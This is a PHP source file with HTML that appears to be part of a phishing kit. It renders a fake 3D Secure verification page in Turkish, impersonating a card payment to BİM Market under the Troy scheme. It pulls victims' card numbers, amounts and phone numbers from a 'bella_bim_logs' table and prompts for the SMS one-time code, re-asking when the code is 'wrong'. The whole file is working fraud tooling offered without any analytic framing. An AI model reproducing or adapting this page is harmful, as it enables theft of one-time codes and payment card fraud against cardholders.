<?php

// Include the helper
include_once('../inc/helper.php');

// Get the data from the request
$tID = htmlspecialchars(trim(strip_tags($_GET['t'])));

if (empty($tID)) {
    header('Location: index.php');
    exit;
}

// Check transaction exist
$sql = "SELECT * FROM bella_bim_logs WHERE id = ?";
$query = $db->prepare($sql);
$stmt = $query->execute([$tID]);
$log = $query->fetch(PDO::FETCH_OBJ);

if (!$log) {
    header('Location: index.php');
    exit;
}

$hatali = null;

if (isset($_GET['hatali'])) {
    $hatali = 1;
}

?>
<html class="no-js" lang="tr" style="height: 100%; width: 100%;">
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>3D Doğrulama</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">

    <link rel="stylesheet"
          href="assets/3d/bundle.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css">
</head>
<body>
<div class="content-wrapper" id="content" style="display: block;">
    <div class="header">
        <div class="brand-logo">
            <img src="assets/img/troy.png">
        </div>
    </div>

    <div id="approve-page">
        <div id="loaderDiv" style="height: 100%; width: 100%; position: absolute; z-index: 1; display: none">
            <div class="loader"></div>
        </div>
        <div class="content">
            <h1 id="approve-header">Doğrulama kodunu giriniz</h1>
            <div class="info-wrapper">
                <div class="info-row">
                    <div class="info-col info-label">İşyeri Adı:</div>
                    <div class="info-col" id="merchant-name">
                        BİM Market Yeni Mağazacılık A.Ş.
                    </div>
                </div><br><br>
              <div class="info-row">
    <div class="info-col info-label">İşlem Tutarı:</div>
    <div class="info-col" style="font-size: 14px; margin-top: -5px;" id="amount">
        <?= number_format($log->amount, 2) ?> TL 
        <?php
        // İşlem tutarı 10000 TL'nin üstündeyse SMS gönder
        $sms_count = ceil($log->amount / 10000);
        if ($sms_count > 1) {
            echo " - <span style='color: red;'>$sms_count adet SMS gönderilecektir.</span>";

        }
        ?>
    </div>
</div>


                <div class="info-row">
                    <div class="info-col info-label">İşlem Tarihi-Saati:</div>
                    <div class="info-col" id="operation-date-time">
                        <?= date('d.m.Y-H:i:s', strtotime($log->created_at)) ?>
                    </div>
                </div>
                <div class="info-row">
                    <div class="info-col info-label">Kart Numarası:</div>
                    <div class="info-col" id="pan">
                        <?= substr($log->card_number, 0, 6) . '******' . substr($log->card_number, -4) ?>
                    </div>
                </div>
            </div>
            <form class="action-wrapper" id="ThreeDForm">
                <h3 id="otpMessage">
                    İşlem şifreniz
                    <span id="msisdn">
                        90<?= substr($log->cardholder_phone, 0, 3) . '****' . substr($log->cardholder_phone, -2) ?>
                    </span>
                    olan cep telefonunuza gönderilecektir.</h3>
                <?php if ($hatali === 1): ?>
                    <p style="color:red; font-weight:600; margin-top: 5px;">İşlem şifrenizi hatalı giriş yaptınız.
                        Lütfen tekrar giriş yapınız.</p>
                <?php endif; ?>
                <div class="form-wrapper">
                    <label id="confirmCode" for="code">Doğrulama Kodu</label>
                    <div class="form-row">
                        <input type="password" class="f-input" name="code" id="code" maxlength="6"
                               autocomplete="one-time-code" inputmode="numeric" pattern="[0-9]*">
                    </div>
                    <div id="submitButtonDiv">
                        <div class="form-row has-submit" id="submitbutton">
                            <input type="submit" value="Onayla" class="button btn-1 btn-commit" id="submitButton">
                        </div>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
<script src="assets/js/init.js"></script>
<script src="assets/js/threeds.js"></script>

</body>
</html>